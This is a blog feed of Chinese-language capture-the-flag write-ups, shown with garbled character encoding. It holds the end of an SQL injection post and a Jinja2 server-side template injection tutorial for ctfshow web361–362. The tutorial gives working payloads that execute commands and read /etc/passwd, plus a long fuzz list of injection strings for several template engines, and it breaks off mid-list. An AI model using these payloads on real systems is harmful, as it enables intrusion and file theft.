extractvalue(0x0a,concat(0x0a,(select user()))) and &#x27;1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">tid=1&amp;user=1&amp;title=1&amp;tel=13011111111&amp;body=123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cdn-src-ip: 2&#x27; and extractvalue(0x0a,concat(0x0a,(select group_concat(schema_name)   from information_schema.schemata))) and &#x27;1</span><br><span class="line">information_schema,jizhicms,jiz</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-sstiå­¦ä¹ </title>
      <link href="/2023/04/07/ctfshow-ssti%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/04/07/ctfshow-ssti%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="SSTIæ˜¯ä»€ä¹ˆ"><a href="#SSTIæ˜¯ä»€ä¹ˆ" class="headerlink" title="SSTIæ˜¯ä»€ä¹ˆ"></a>SSTIæ˜¯ä»€ä¹ˆ</h3><p>SSTIï¼ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æ¨¡æ¿å¼•æ“+æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€ä¸‹æ¨¡æ¿å¼•æ“</p><blockquote><p>æ¨¡æ¿å¼•æ“æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®åˆ†ç¦»è€Œäº§ç”Ÿï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œåˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„ HTML ä»£ç ï¼Œæ¨¡æ¿å¼•æ“ä¼šæä¾›ä¸€å¥—ç”Ÿæˆ HTML ä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œç„¶åæ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œç„¶åç”Ÿæˆæ¨¡æ¿ + ç”¨æˆ·æ•°æ®çš„å‰ç«¯ HTML é¡µé¢ï¼Œç„¶ååé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ã€‚</p></blockquote><p>æ¨¡æ¿åªæ˜¯ä¸€ç§æä¾›ç»™ç¨‹åºæ¥è§£æçš„ä¸€ç§è¯­æ³•ï¼Œæ¢å¥è¯è¯´ï¼Œæ¨¡æ¿æ˜¯ç”¨äºä»æ•°æ®ï¼ˆå˜é‡ï¼‰åˆ°å®é™…çš„è§†è§‰è¡¨ç°ï¼ˆHTMLä»£ç ï¼‰è¿™é¡¹å·¥ä½œçš„ä¸€ç§å®ç°æ‰‹æ®µï¼Œè€Œè¿™ç§æ‰‹æ®µä¸è®ºåœ¨å‰ç«¯è¿˜æ˜¯åç«¯éƒ½æœ‰åº”ç”¨ã€‚<br>é€šä¿—ç‚¹ç†è§£ï¼šæ‹¿åˆ°æ•°æ®ï¼Œå¡åˆ°æ¨¡æ¿é‡Œï¼Œç„¶åè®©æ¸²æŸ“å¼•æ“å°†èµ›è¿›å»çš„ä¸œè¥¿ç”Ÿæˆ html çš„æ–‡æœ¬ï¼Œè¿”å›ç»™æµè§ˆå™¨ï¼Œè¿™æ ·åšçš„å¥½å¤„å±•ç¤ºæ•°æ®å¿«ï¼Œå¤§å¤§æå‡æ•ˆç‡ã€‚</p><p>å¸¸è§çš„æ¨¡æ¿å¼•æ“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP: Smarty, Twig, Blade</span><br><span class="line">JAVA: JSP, FreeMarker, Velocity</span><br><span class="line">Python: Jinja2, django, tornado</span><br></pre></td></tr></table></figure><p>ç”±äºæ¸²æŸ“çš„æ•°æ®æ˜¯ä¸šåŠ¡æ•°æ®,ä¸”å¤§å¤šæ•°éƒ½ç”±ç”¨æˆ·æä¾›,è¿™å°±æ„å‘³ç€ç”¨æˆ·å¯¹è¾“å…¥å¯æ§.å¦‚æœåç«¯æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œæ£€æµ‹å’Œåˆ¤æ–­,é‚£ä¹ˆå°±å®¹æ˜“äº§ç”Ÿä»£ç å’Œæ•°æ®æ··æ·†,ä»è€Œäº§ç”Ÿæ³¨å…¥.</p><p>åœ¨ SSTI æ¼æ´ç‚¹ä¸­ï¼Œ é‡Œé¢çš„å†…å®¹ä¼šè¢«æ‰§è¡Œã€‚</p><p>æ­¤ç¯‡æ–‡ç« ä»…æ¢ç©¶pythonä¸­ssti</p><p>é¢˜ç›®åœ°å€    <a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p><blockquote><p>ä¸ªäººç†è§£sstié¢˜ç›®å°±æ˜¯è·å–ä¸€äº›å±é™©å­ç±»ï¼Œåœ¨å±é™©å­ç±»ä¸­å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„å‡½æ•°æ¥å‘½ä»¤æ‰§è¡Œæˆ–æ–‡ä»¶è¯»å–ç­‰</p></blockquote><h4 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h4><p>åœ¨å­¦ä¹ SSTIæ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€äº›pythonçš„é­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»</p><p><code>__class__</code>ç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»<br>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;abcd&#x27;.__class__</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;class &#x27;tuple&#x27;&gt;</span><br></pre></td></tr></table></figure><p><code>__base__</code>ç”¨äºè·å–ç±»çš„åŸºç±»ï¼ˆä¹Ÿç§°çˆ¶ç±»ï¼‰<br>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__base__</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br><span class="line">//objectä¸ºstrçš„åŸºç±»</span><br></pre></td></tr></table></figure><p><code>__mro__</code>è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºã€‚ï¼ˆå½“è°ƒç”¨_mro_[1]æˆ–è€…-1æ—¶ä½œç”¨å…¶å®ç­‰åŒäº_base_ï¼‰<br>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[1]</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[-1]</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure><p><code>__subclasses__()</code>å¯ä»¥è·å–ç±»çš„æ‰€æœ‰å­ç±»<br>ç¤ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[-1].__subclasses__()</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;,&lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;...]</span><br></pre></td></tr></table></figure><h4 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h4><p>é¢˜ç›®ä¼ å‚ä¸ºname ä¹Ÿå°±æ˜¯/?name=1</p><p><a href="http://7650d43c-2ae1-4428-aa41-80f2cd571827.challenge.ctf.show/?name=1">http://7650d43c-2ae1-4428-aa41-80f2cd571827.challenge.ctf.show/?name=1</a></p><p>å›æ˜¾ä¸º1ï¼Œæµ‹è¯•æ˜¯å¦å­˜åœ¨sstiæ¼æ´ï¼Œ</p><p><code>payloadï¼šhttp://7650d43c-2ae1-4428-aa41-80f2cd571827.challenge.ctf.show/?name=&#123;&#123;7*7&#125;&#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">æ­£å¸¸æ²¡æœ‰æ¼æ´å°†å›æ˜¾ä¼ å…¥çš„å€¼ï¼Œç„¶è€Œ`Flask`ä¸­ä½¿ç”¨äº†`Jinja2` ä½œä¸ºæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œ&#123;&#123;&#125;&#125;åœ¨`Jinja2`ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼Œ`Jinja2`åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ&#123;&#123;&#125;&#125;åŒ…è£¹çš„å†…å®¹è¿›è¡Œè§£æã€‚`&#123;&#123;7*7&#125;&#125;`ä¼šè¢«è§£ææˆ49ã€‚</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸€æ­¥ä½¿ç”¨ classè·å–å½“å‰ç±»ä½¿ç”¨`__class__`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;1.__class__\&#125;\&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">&lt;class &#x27;int&#x27;&gt;</span><br><span class="line"></span><br><span class="line">name=&#123;&#123;a.__class__&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">&lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç¬¬äºŒæ­¥ä½¿ç”¨ è·å–å½“å‰ç±»çš„åŸºç±»ï¼Œè¿™é‡Œå¯ä»¥ç”¨`__base__`ï¼Œä¹Ÿå¯ä»¥ç”¨`__mro__`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">å–object</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]&#125;&#125;</span><br><span class="line">æˆ–</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">æˆ–</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__mro__[-1]&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç¬¬ä¸‰æ­¥è·å–åŸºç±»çš„å­ç±»ï¼Œè¿™é‡Œå¯ä»¥ç”¨`__subclasses__()`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__mro__[-1].__subclasses__()&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;,........</span><br></pre></td></tr></table></figure><p>ç¬¬å››æ­¥ï¼Œè·å–å¯ä»¥ä½¿ç”¨ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">è„šæœ¬<span class="number">1</span>  æœ¬åœ°æŸ¥æ‰¾</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æŸ¥æ‰¾åˆ°çš„çˆ¶ç±»åˆ—è¡¨æ›¿æ¢åˆ°dataä¸­</span></span><br><span class="line">data = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ......]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># åœ¨è¿™é‡Œæ·»åŠ å¯ä»¥åˆ©ç”¨çš„ç±»ï¼Œä¸‹é¢ä¼šä»‹ç»è¿™äº›ç±»çš„åˆ©ç”¨æ–¹æ³•</span></span><br><span class="line">userful_class = [<span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;os._wrap_close&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, <span class="string">&#x27;warnings.catch_warnings&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>, <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span>)</span><br><span class="line">class_list = re.findall(pattern, data)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> class_list:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> userful_class:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(class_list.index(c)) + <span class="string">&quot;: &quot;</span> + c)</span><br><span class="line">            </span><br><span class="line">//          </span><br><span class="line">è„šæœ¬<span class="number">2</span> åœ¨çº¿æŸ¥æ‰¾</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:5000/?name=\</span></span><br><span class="line"><span class="string">        &#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230408161509018.png" alt="image-20230408161509018"></p><p>å¯ä»¥çœ‹åˆ°oså¯ä»¥ä½¿ç”¨ï¼Œåœ¨132ä½</p><p><code>&#123;&#123;"".__class__.__mro__[-1].__subclasses__()[132]&#125;&#125;</code></p><p>ç¬¬äº”æ­¥ï¼Œç»§ç»­æ„é€ ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥åˆ©ç”¨<code>osã€‚_wrap_close</code>ï¼Œè¿™ä¸ªç±»ä¸­æœ‰<code>popen</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å»è°ƒç”¨å®ƒ</p><p>å…ˆè°ƒç”¨å®ƒçš„__init__æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ç±»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__&#125;&#125;</span><br><span class="line">è¿”å›</span><br><span class="line">//&lt;function _wrap_close.__init__ at 0x7f37bfb745e0&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç„¶åå†è°ƒç”¨__globals__è·å–åˆ°æ–¹æ³•å†…ä»¥å­—å…¸çš„å½¢å¼è¿”å›çš„æ–¹æ³•ã€å±æ€§ç­‰</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409220834519.png" alt="image-20230409220834519"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;id&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409220943551.png" alt="image-20230409220943551"></p><p>å³å¯å‘½ä»¤æ‰§è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5dc9087f-a33a-43fd-89f6-729c41675180.challenge.ctf.show/?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="web362-å¼€å§‹è¿‡æ»¤"><a href="#web362-å¼€å§‹è¿‡æ»¤" class="headerlink" title="web362 å¼€å§‹è¿‡æ»¤"></a>web362 å¼€å§‹è¿‡æ»¤</h4><p>ä¸æ¸…æ¥šè¿‡æ»¤äº†ä»€ä¹ˆï¼Œfuzzä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;4*4&#125;&#125;[[5*5]]</span><br><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;</span><br><span class="line">&lt;%= 7 * 7 %&gt;</span><br><span class="line">$&#123;3*3&#125;</span><br><span class="line">$&#123;&#123;7*7&#125;&#125;</span><br><span class="line">@(1+2)</span><br><span class="line">#&#123;3*3&#125;</span><br><span class="line">#&#123; 7 * 7 &#125;</span><br><span class="line">&#123;&#123;dump(app)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.server.all|join(&#x27;,&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123; [].class.base.subclasses() &#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.class.mro()[1].subclasses()&#125;&#125;</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;</span><br><span class="line">&#123;% for key, value in config.iteritems() %&#125;&lt;dt&gt;&#123;&#123; key|e &#125;&#125;&lt;/dt&gt;&lt;dd&gt;&#123;&#123; value|e &#125;&#125;&lt;/dd&gt;&#123;% endfor %&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.toUpperCase()&#125;&#125; </span><br><span class="line">&#123;&#123; request &#125;&#125;</span><br><span class="line">&#123;&#123;self&#125;&#125;</span><br><span class="line">&lt;%= File.open(&#x27;/etc/passwd&#x27;).read %&gt;</span><br><span class="line">&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;id&quot;)&#125;</span><br><span class="line">[#assign ex = &#x27;freemarker.template.utility.Execute&#x27;?new()]$&#123; ex(&#x27;id&#x27;)&#125;</span><br><span class="line">$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)&#125;</span><br><span class="line">&#123;&#123;app.request.query.filter(0,0,1024,&#123;&#x27;options&#x27;:&#x27;system&#x27;&#125;)&#125;&#125;</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read() &#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.mro()[1].__subclasses__()[396](&#x27;cat flag.txt&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(request.args.input).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br><span class="line">&#123;$smarty.version&#125;</span><br><span class="line">&#123;php&#125;echo `id`;&#123;/php&#125;</span><br><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat\x20/etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat$IFS/etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([&quot;__&quot;,&quot;class&quot;,&quot;__&quot;]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(&quot;__class__&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;request.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(&#x27;application&#x27;)|attr(&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fimport\x5f\x5f&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;id&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;new java.lang.String(&#x27;xxx&#x27;)\&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;whoami\\\&quot;); x.start()\&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new 